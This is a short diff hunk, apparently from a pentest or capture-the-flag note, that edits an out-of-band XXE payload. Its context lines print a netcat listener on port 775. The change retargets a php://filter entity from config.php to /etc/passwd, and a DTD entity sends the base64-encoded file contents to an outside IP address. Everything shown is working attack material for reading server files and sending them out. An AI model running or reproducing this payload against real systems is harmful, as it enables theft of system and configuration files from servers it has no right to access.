@@ -17,6 +17,6 @@ cat /var/www/dtd.xml
 nc -nlvp 775
 ```
 
-<!ENTITY % MeMe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> 
+<!ENTITY % MeMe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
 <!ENTITY % NyaMeeEain "<!ENTITY exfil SYSTEM 'http://54.14.109.223:775/dtd.xml?%MeMe;'>">
 ```
